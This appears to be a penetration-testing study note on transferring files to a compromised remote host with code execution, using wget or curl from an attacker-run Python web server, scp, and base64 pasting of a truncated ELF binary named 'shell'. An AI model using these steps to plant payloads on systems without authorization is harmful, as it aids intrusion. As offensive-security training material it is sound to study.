# Using Wget

## Python HTTP server
- Run a python HTTP server on our machine and then use wget or cURL to download the file on the remote host.
1. Go to the directory  that contains the file we need to transfer and then run a Python HTTP server in it.
	
```shell-session
	cd /tmp
	python3 -m http.server 8000
```

2. Now our listening server is ready, we can download the file on the remote host that we have code execution on : 
	```shell-session
	wget http://<ip-address>/<filename>
	```

# Using cURL

- If the remote host does not have wget, we can use curl to download the file.
```shell-session
curl http://<ip-address>/<filename> -o <filename>
```

# Using SCP

- If we have the `ssh credentials` on the remote host, we can try usig scp as follows : 

```shell-session
scp <filename> user@remotehost:/tmp/<filename>
```
- we'll need the ssh credentials for this to work.

# Using Base64

- If none of the above methods work, we can try base64 encode the file into base64 format and then paste the base64 string on the remote server and decode it.

**Eg:**

```shell-session
#consider that we wanna transfer a file called shell
base64 shell -w 0
```
- copy the base64 string to the remote host and use `base64 -d` to decode it.
```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

# Validating File Transfers

- `file` command can be used to validate the format of a file.
```shell-session
file shell
```

- To ensure that we did not mess up the file during encoding/decoding process, we can check its md5 hash. On our machine, we can run md5sum on it.
```shell-session
ms5sum shell
```
- Run the same command at both the remote server and at our own machine and verify that they are the same.
